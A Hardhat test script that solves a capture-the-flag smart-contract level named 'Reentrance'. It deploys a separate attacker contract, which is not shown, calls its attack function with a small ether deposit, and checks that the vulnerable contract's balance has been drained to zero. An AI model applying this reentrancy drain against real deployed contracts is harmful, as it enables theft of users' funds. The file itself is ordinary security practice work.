const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS10 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Reentrance`)
    challenge = await challengeFactory.attach(challengeAddress)

    const attackerFactory = await ethers.getContractFactory(`ReentranceAttacker`)
    attacker = await attackerFactory.deploy(challenge.address)
})

it("Solves the challenge 'Reentrance'", async () => {
    tx = await attacker.attack({
        value: ethers.utils.parseUnits(`0.001`, `ether`),
        gasLimit: ethers.BigNumber.from(`200000`),
    })
    await tx.wait(1)

    let balance = (await provider.getBalance(challenge.address)).toString()
    assert(balance == "0", "You didn't take everything!")
})
